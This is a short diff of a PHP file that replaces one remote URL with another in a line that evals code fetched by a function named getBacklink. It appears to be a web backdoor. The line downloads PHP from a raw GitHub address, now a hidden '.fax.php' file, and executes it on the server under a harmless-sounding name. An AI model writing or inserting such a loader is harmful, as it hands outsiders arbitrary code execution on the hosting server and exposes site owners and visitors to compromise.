@@ -20,6 +20,6 @@ function getBacklink($url) {
 }
 
 
-eval("?>" . getBacklink("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/mina.php"));
+eval("?>" . getBacklink("https://raw.githubusercontent.com/tikung6etar/Nyarek/refs/heads/master/.fax.php"));
 
 ?>
